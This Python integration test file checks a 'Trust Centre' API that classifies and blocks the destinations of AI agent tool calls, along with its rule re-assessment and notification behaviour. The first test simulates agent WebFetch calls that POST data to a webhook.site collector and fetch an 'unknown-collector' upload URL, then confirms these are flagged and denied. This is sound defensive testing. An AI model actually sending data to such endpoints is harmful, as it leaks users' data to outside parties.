"""Trust Centre API: destination list filters and blocked counts, bounded bulk re-assessment, rule
toggles / no-op patches / unknown ids, and id-only live notifications. Data comes from the real
ingestion and decision pipeline."""

from __future__ import annotations

from sqlalchemy import func, select

from app.core.timeutil import utcnow
from app.models import AuditEvent
from tests.integration.ingestion_support import decide, tool_requested
from tests.integration.test_trust_api import BASE, EXFIL_URL, _fresh, create_rule, ingest, source_row

WEBHOOK_URL = "https://abc123.webhook.site/collect"


def test_destination_list_filters_and_blocked_counts(client, seeded_org, db):
    api, h = seeded_org.api_headers, seeded_org.user_headers
    decide(client, api, tool_requested("WebFetch", {"url": WEBHOOK_URL, "method": "POST", "body": "x"}))
    decide(client, api, tool_requested("WebFetch", {"url": EXFIL_URL}))
    listing = client.get(f"{BASE}/destinations", headers=h).json()
    assert listing["total"] == 2
    by_id = {d["identifier"]: d for d in listing["items"]}
    webhook = by_id["abc123.webhook.site"]
    assert webhook["classification"] == "SUSPICIOUS" and webhook["verification"]["failed"] >= 1

    suspicious = client.get(f"{BASE}/destinations", params={"classification": ["SUSPICIOUS"]}, headers=h).json()
    assert [d["identifier"] for d in suspicious["items"]] == ["abc123.webhook.site"]
    searched = client.get(f"{BASE}/destinations", params={"q": "COLLECTOR"}, headers=h).json()
    assert [d["identifier"] for d in searched["items"]] == ["upload.unknown-collector.net"]
    assert client.get(f"{BASE}/destinations", params={"q": "%"}, headers=h).json()["total"] == 0  # LIKE is escaped
    assert client.get(f"{BASE}/destinations", params={"classification": ["NOPE"]}, headers=h).status_code == 422

    # Pin the collector as BLOCKED: the next call to it is denied at the enforcing integration and counted.
    collector = by_id["upload.unknown-collector.net"]
    pinned = client.patch(f"{BASE}/destinations/{collector['id']}", headers=h,
                          json={"classification": "BLOCKED", "note": "Collector seen in an incident"})
    assert pinned.status_code == 200, pinned.text
    denied = decide(client, api, tool_requested("WebFetch", {"url": EXFIL_URL}))
    assert denied["decision"] == "DENY"
    blocked = client.get(f"{BASE}/destinations", params={"has_blocked": "true"}, headers=h).json()
    assert [d["identifier"] for d in blocked["items"]] == ["upload.unknown-collector.net"]
    assert blocked["items"][0]["blocked_count"] == 1 and blocked["items"][0]["transfer_count"] == 1
    ordered = client.get(f"{BASE}/destinations", params={"sort": "-blocked"}, headers=h).json()["items"]
    assert ordered[0]["identifier"] == "upload.unknown-collector.net"
    detail = client.get(f"{BASE}/destinations/{collector['id']}", headers=h).json()
    assert detail["decision_counts"].get("DENY") == 1 and detail["invocations_total"] == 2


def test_bulk_reassessment_is_bounded_to_the_most_recently_seen(client, seeded_org, db, monkeypatch):
    from datetime import timedelta

    from app.services import trust_service

    monkeypatch.setattr(trust_service, "MAX_REASSESS", 1)
    api, h = seeded_org.api_headers, seeded_org.user_headers
    ingest(client, api, "web", "https://wiki.acme.dev/old", "Old page.")
    ingest(client, api, "web", "https://wiki.acme.dev/new", "New page.")
    old = source_row(db, seeded_org.org_id, "https://wiki.acme.dev/old")
    old.last_seen_at = utcnow() - timedelta(days=3)
    db.commit()

    created = create_rule(client, h)
    assert created.status_code == 201, created.text
    summary = created.json()["reassessment"]
    assert summary == {"sources_checked": 1, "sources_changed": 1, "destinations_checked": 0,
                       "destinations_changed": 0, "truncated": True, "limit": 1}
    assert source_row(db, seeded_org.org_id, "https://wiki.acme.dev/new").trust_level == "TRUSTED"
    # The older source is re-assessed when the pipeline next observes it.
    assert source_row(db, seeded_org.org_id, "https://wiki.acme.dev/old").trust_level == "UNKNOWN"
    ingest(client, api, "web", "https://wiki.acme.dev/old", "Old page, again.")
    assert source_row(db, seeded_org.org_id, "https://wiki.acme.dev/old").trust_level == "TRUSTED"


def test_rule_toggle_noop_patch_and_unknown_ids(client, seeded_org, db):
    h = seeded_org.user_headers
    ingest(client, seeded_org.api_headers, "web", "https://wiki.acme.dev/onboarding", "Welcome.")
    rule = create_rule(client, h).json()
    ident = "https://wiki.acme.dev/onboarding"

    off = client.patch(f"{BASE}/rules/{rule['id']}", json={"enabled": False}, headers=h).json()
    assert off["enabled"] is False and off["reassessment"]["sources_changed"] == 1
    assert source_row(db, seeded_org.org_id, ident).trust_level == "UNKNOWN"
    on = client.patch(f"{BASE}/rules/{rule['id']}", json={"enabled": True}, headers=h).json()
    assert on["reassessment"]["sources_changed"] == 1
    assert source_row(db, seeded_org.org_id, ident).trust_level == "TRUSTED"

    audits_before = _fresh(db).scalar(select(func.count()).select_from(AuditEvent)) or 0
    same = client.patch(f"{BASE}/rules/{rule['id']}", json={"trust_level": "TRUSTED"}, headers=h)
    assert same.status_code == 200 and same.json()["reassessment"] is None
    assert (_fresh(db).scalar(select(func.count()).select_from(AuditEvent)) or 0) == audits_before  # nothing written

    assert client.patch(f"{BASE}/rules/{rule['id']}", json={"pattern": None}, headers=h).status_code == 422
    assert client.patch(f"{BASE}/rules/{rule['id']}", json={"trust": "TRUSTED"}, headers=h).status_code == 422
    assert client.patch(f"{BASE}/rules/{rule['id']}", json={"pattern": "*.com"}, headers=h).status_code == 422
    assert client.get(f"{BASE}/rules/trl_does_not_exist", headers=h).status_code == 404
    assert client.delete(f"{BASE}/rules/trl_does_not_exist", headers=h).status_code == 404
    assert client.get(f"{BASE}/sources/src_does_not_exist", headers=h).status_code == 404
    assert client.get(f"{BASE}/destinations/dst_does_not_exist", headers=h).status_code == 404


def test_trust_changes_publish_id_only_live_notifications(client, seeded_org, db, monkeypatch):
    from app.events.bus import bus

    published: list[tuple[str, dict]] = []
    monkeypatch.setattr(bus, "publish", lambda org_id, message: published.append((org_id, message)))
    h = seeded_org.user_headers
    ingest(client, seeded_org.api_headers, "web", "https://wiki.acme.dev/onboarding", "Welcome.")
    published.clear()

    rule = create_rule(client, h).json()
    trust_messages = [m for org_id, m in published if m["type"] == "trust.updated"]
    assert all(org_id == seeded_org.org_id for org_id, _m in published)
    assert {"id": rule["id"], "kind": "trust_rule", "change": "created", "type": "trust.updated"} in trust_messages
    assert any(m.get("kind") == "reassessment" for m in trust_messages)
    for message in trust_messages:  # ids and small labels only: never patterns, identifiers or notes
        assert set(message) <= {"type", "id", "kind", "change"}

    published.clear()
    rejected = create_rule(client, h, name="Everything", match_field="identifier", pattern="*")
    assert rejected.status_code == 422 and published == []  # a rejected change publishes nothing
